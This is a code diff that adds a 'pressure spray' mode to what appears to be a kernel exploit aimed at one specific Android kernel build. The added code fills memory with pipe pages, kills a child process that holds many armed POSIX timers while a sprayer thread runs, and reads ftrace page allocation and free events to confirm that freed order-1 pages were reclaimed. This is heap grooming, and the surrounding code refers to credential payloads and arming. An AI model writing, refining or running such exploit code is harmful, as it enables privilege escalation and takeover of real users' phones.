@@ -65,7 +65,7 @@ static int append_str(const char *p, const char *v)
 
 static uint64_t g_slide;
 static int g_len36;
-static int g_dry, g_arm, g_delay = 120, g_preview, g_concurrent;
+static int g_dry, g_arm, g_delay = 120, g_preview, g_concurrent, g_pressure;
 
 /* Known call sites for 6.18.21-android17-5-g805aa6adea19-abogki565292102-4k.
  * Each is (function entry + offset) as observed in the text trace; the offset
@@ -554,6 +554,145 @@ static int concurrent_spray(int spray_delay_us, int kill_delay_us)
     return 0;
 }
 
+
+/* ---------------- memory pressure + spray (BRM ordering) ---------------- */
+
+#define PRESSURE_MB 66
+
+static int hold_pipe_pages(int mb)
+{
+    int made = 0, i;
+    char buf[65536];
+    memset(buf, 0x5a, sizeof(buf));
+    for (i = 0; i < mb; i++) {
+        int p[2];
+        if (pipe(p) != 0) break;
+        if (fcntl(p[1], F_SETPIPE_SZ, 1024 * 1024) <= 0) { close(p[0]); close(p[1]); break; }
+        /* fill 1 MiB with 64 KiB writes */
+        {
+            int k, ok = 1;
+            for (k = 0; k < 16; k++) {
+                if (write(p[1], buf, sizeof(buf)) != (ssize_t)sizeof(buf)) { ok = 0; break; }
+            }
+            if (!ok) { close(p[0]); close(p[1]); break; }
+        }
+        made++;
+    }
+    return made;
+}
+
+static int pressure_spray(void)
+{
+    int pipefd[2];
+    pid_t child;
+    pthread_t th;
+    struct spray_ctx sc;
+    int held;
+
+    memset(&sc, 0, sizeof(sc));
+
+    printf("=== pressure spray ===\n");
+    write_str(T "/tracing_on", "0\n");
+    { int fd = open(T "/trace", O_WRONLY | O_TRUNC); if (fd >= 0) close(fd); }
+    write_str(T "/tracing_on", "1\n");
+
+    held = hold_pipe_pages(PRESSURE_MB);
+    printf("pressure: %d MiB held in pipe pages\n", held);
+
+    if (pipe(pipefd) != 0) return -1;
+    child = fork();
+    if (child == 0) {
+        pthread_t eth;
+        struct local_exec lc;
+        timer_t timers[8];
+        static timer_t many[CHILD_TIMERS];
+        struct sigevent sev;
+        struct itimerspec its;
+        struct sigaction sa;
+        int armed = 0;
+        int i;
+
+        close(pipefd[0]);
+        memset(&sa, 0, sizeof(sa)); sa.sa_handler = handler_noop; sigaction(SIGRTMIN, &sa, NULL);
+        memset(&sev, 0, sizeof(sev));
+        sev.sigev_notify = SIGEV_SIGNAL;
+        sev.sigev_signo = SIGRTMIN;
+        memset(&its, 0, sizeof(its));
+        its.it_value.tv_nsec = 200000L;
+        its.it_interval.tv_nsec = 200000L;
+        for (i = 0; i < CHILD_TIMERS; i++) {
+            if (timer_create(CLOCK_THREAD_CPUTIME_ID, &sev, &many[i]) != 0) break;
+            if (timer_settime(many[i], 0, &its, NULL) != 0) break;
+            armed++;
+        }
+        (void)timers;
+        lc.fd = pipefd[1];
+        lc.tid = (pid_t)syscall(SYS_gettid);
+        (void)!write(pipefd[1], &armed, sizeof(armed));
+        if (pthread_create(&eth, NULL, (void *(*)(void *))exec_thread, &lc) != 0) _exit(9);
+        for (;;) pause();
+    }
+
+    close(pipefd[1]);
+    {
+        int armed_report = 0;
+        if (read(pipefd[0], &armed_report, sizeof(armed_report)) != (ssize_t)sizeof(armed_report))
+            armed_report = -1;
+        close(pipefd[0]);
+        printf("child=%d  timers_armed=%d\n", (int)child, armed_report);
+    }
+
+    if (pthread_create(&th, NULL, sprayer, &sc) != 0) return -1;
+    usleep(2000);
+    printf("kill(%d, SIGKILL)\n", (int)child);
+    kill(child, SIGKILL);
+    usleep(300000);
+    sc.stop = 1;
+    pthread_join(th, NULL);
+    write_str(T "/tracing_on", "0\n");
+    printf("sprayer: %d streams\n", sc.sent);
+
+    {
+        unsigned long long frees[128], allocs[128];
+        char big[1 << 20];
+        int fd = open(T "/trace", O_RDONLY);
+        int nf = 0, na = 0, hit = 0;
+        if (fd >= 0) {
+            ssize_t n = read(fd, big, sizeof(big) - 1);
+            close(fd);
+            if (n > 0) {
+                char *line = big;
+                big[n] = 0;
+                while (line && *line) {
+                    char *nl = strchr(line, '\n');
+                    if (nl) *nl = 0;
+                    if (strstr(line, "order=1")) {
+                        char *pp = strstr(line, "pfn=0x");
+                        if (pp && strstr(line, "mm_page_free") && nf < 128)
+                            frees[nf++] = strtoull(pp + 6, NULL, 16);
+                        else if (pp && strstr(line, "mm_page_alloc") && na < 128)
+                            allocs[na++] = strtoull(pp + 6, NULL, 16);
+                    }
+                    line = nl ? nl + 1 : NULL;
+                }
+            }
+        }
+        printf("order-1 frees=%d allocs=%d\n", nf, na);
+        {
+            int i2, j2;
+            for (i2 = 0; i2 < nf && i2 < 8; i2++) printf("  free  pfn=0x%llx\n", frees[i2]);
+            for (j2 = 0; j2 < na && j2 < 8; j2++) printf("  alloc pfn=0x%llx\n", allocs[j2]);
+            for (i2 = 0; i2 < nf; i2++)
+                for (j2 = 0; j2 < na; j2++)
+                    if (frees[i2] == allocs[j2]) { printf("  CLAIMED pfn=0x%llx\n", frees[i2]); hit++; }
+        }
+        if (!hit) printf("  no order-1 PFN intersection\n");
+    }
+    printf("holding %d MiB and the zombie %d; NOT exiting (exit would let init reap)\n", held, (int)child);
+    for (;;) pause();
+    return 0;
+}
+
 /* ---------------- timer construction ---------------- */
 
 static void noop(int s) { (void)s; }
@@ -624,6 +763,7 @@ int main(int argc, char **argv)
         if (!strcmp(argv[i], "--preflight")) { print_preflight(); return 0; }
         if (!strcmp(argv[i], "--payload-preview")) { g_preview = 1; }
         if (!strcmp(argv[i], "--concurrent-spray")) { g_concurrent = 1; }
+        if (!strcmp(argv[i], "--pressure-spray")) { g_pressure = 1; }
         if (!strcmp(argv[i], "--arm-test")) return arm_test();
         if (!strcmp(argv[i], "--run")) do_run = 1;
         if (!strcmp(argv[i], "--dry-exec")) { g_dry = 1; do_run = 1; accept = 1; }
@@ -637,6 +777,7 @@ int main(int argc, char **argv)
         preview_payload(task, cred);
         return 0;
     }
+    if (g_pressure) { pressure_spray(); return 0; }
     if (g_concurrent) {
         printf("=== concurrent spray ===\n");
         concurrent_spray(2000, 0);
